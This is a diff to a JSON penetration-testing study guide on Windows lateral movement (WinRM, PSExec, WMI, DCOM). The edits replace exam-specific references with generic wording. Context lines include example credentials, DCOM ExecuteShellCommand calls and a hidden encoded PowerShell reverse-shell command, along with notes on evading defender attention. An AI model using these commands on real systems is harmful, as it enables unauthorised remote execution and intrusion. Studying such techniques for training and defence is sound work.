@@ -16,14 +16,14 @@
           "After obtaining credentials (plaintext, hash, or Kerberos ticket) from initial compromise",
           "When port scanning reveals SMB (445), RPC (135), or WinRM (5985/5986) open on targets",
           "Before attempting privilege escalation - sometimes lateral movement to another machine is easier than escalating on current host",
-          "OSCP exam: Master ALL four techniques - different lab machines require different methods based on firewall rules and enabled services"
+          "security assessment: Master ALL four techniques - different lab machines require different methods based on firewall rules and enabled services"
         ]
       },
       "scenarios": [
         {
           "title": "Scenario 1: Decision Tree - Which Lateral Movement Technique to Use?",
           "context": "You have domain credentials (corp\\jsmith:Password123) and nmap scan shows target 192.168.50.100 with ports 135, 139, 445, 5985 open. You need to decide: WMI, WinRM, PSExec, or DCOM? Each has different requirements, advantages, and failure modes. Making the wrong choice wastes exam time.",
-          "approach": "Use decision tree based on: (1) What ports are open? (2) What tools do you have available (Kali vs. compromised Windows machine)? (3) Do you need interactive shell or one-shot command execution? (4) Do you have password or just hash? (5) How stealthy do you need to be? Follow this priority order for OSCP: WinRM (easiest, interactive) \u2192 PSExec (most reliable, SYSTEM access) \u2192 WMI (fileless, stealthy) \u2192 DCOM (fallback when others blocked).",
+          "approach": "Use decision tree based on: (1) What ports are open? (2) What tools do you have available (Kali vs. compromised Windows machine)? (3) Do you need interactive shell or one-shot command execution? (4) Do you have password or just hash? (5) How stealthy do you need to be? Follow this priority order for security work: WinRM (easiest, interactive) \u2192 PSExec (most reliable, SYSTEM access) \u2192 WMI (fileless, stealthy) \u2192 DCOM (fallback when others blocked).",
           "commands": [
             "lateral-movement-decision-tree",
             "lateral-movement-port-check"
@@ -77,7 +77,7 @@
             "dcom-mmc20-revshell"
           ],
           "expected_outcome": "Test with calculator PoC first: $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc.exe','7'). Calculator spawns on target (verify with: tasklist /S 192.168.50.75 /U admin /P P@ssw0rd | findstr calc). Success! Now deploy reverse shell: $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c powershell -nop -w hidden -e <BASE64>','7'). Netcat listener receives connection. DCOM execution is stealthy (no service creation, no binary upload), but processes run in Session 0 (non-interactive desktop, invisible to logged-in users). This technique is rare - most defenders focus on WMI/PSExec detection, DCOM often overlooked.",
-          "why_this_works": "DCOM (Distributed Component Object Model) allows COM objects to be instantiated and called remotely via RPC. MMC20.Application is a scriptable COM object (ProgID: MMC20.Application) designed for MMC (Microsoft Management Console) automation. It has ExecuteShellCommand method that runs arbitrary commands. Exploitation: (1) Authenticate via RPC (port 135), (2) Request MMC20.Application object from remote registry, (3) Call ExecuteShellCommand method with command arguments. Requirements: RPC port 135 accessible, user has admin rights on target (DCOM activation security), MMC application available (default on all Windows). Uses same RPC port as WMI (135) but different DCOM endpoint, so works when WMI is blocked. Commands run in Session 0 (non-interactive) as authenticated user. OSCP relevance: High - critical fallback when primary techniques fail."
+          "why_this_works": "DCOM (Distributed Component Object Model) allows COM objects to be instantiated and called remotely via RPC. MMC20.Application is a scriptable COM object (ProgID: MMC20.Application) designed for MMC (Microsoft Management Console) automation. It has ExecuteShellCommand method that runs arbitrary commands. Exploitation: (1) Authenticate via RPC (port 135), (2) Request MMC20.Application object from remote registry, (3) Call ExecuteShellCommand method with command arguments. Requirements: RPC port 135 accessible, user has admin rights on target (DCOM activation security), MMC application available (default on all Windows). Uses same RPC port as WMI (135) but different DCOM endpoint, so works when WMI is blocked. Commands run in Session 0 (non-interactive) as authenticated user. relevance: High - critical fallback when primary techniques fail."
         },
         {
           "title": "Scenario 6: Troubleshooting Lateral Movement Failures",
@@ -115,7 +115,7 @@
         },
         {
           "title": "Phase 2: Primary Technique Selection (WinRM or PSExec)",
-          "notes": "For OSCP, prioritize: (1) WinRM from Kali (if port 5985/5986 open and you have password or hash) - provides best interactive shell. (2) PSExec from Kali (if port 445 open and you have local admin creds) - provides SYSTEM shell immediately. These two techniques cover 80% of OSCP lateral movement scenarios. WinRM advantages: interactive PowerShell, file transfer, stable. PSExec advantages: SYSTEM privileges, works on all Windows versions, most documented.",
+          "notes": "For certification, prioritize: (1) WinRM from Kali (if port 5985/5986 open and you have password or hash) - provides best interactive shell. (2) PSExec from Kali (if port 445 open and you have local admin creds) - provides SYSTEM shell immediately. These two techniques cover 80% of certification lateral movement scenarios. WinRM advantages: interactive PowerShell, file transfer, stable. PSExec advantages: SYSTEM privileges, works on all Windows versions, most documented.",
           "commands": [
             {
               "id": "evil-winrm-creds",
@@ -240,8 +240,7 @@
         "WINRM",
         "PSEXEC",
         "WMI",
-        "DCOM",
-        "OSCP:HIGH"
+        "DCOM"
       ]
     }
   ]
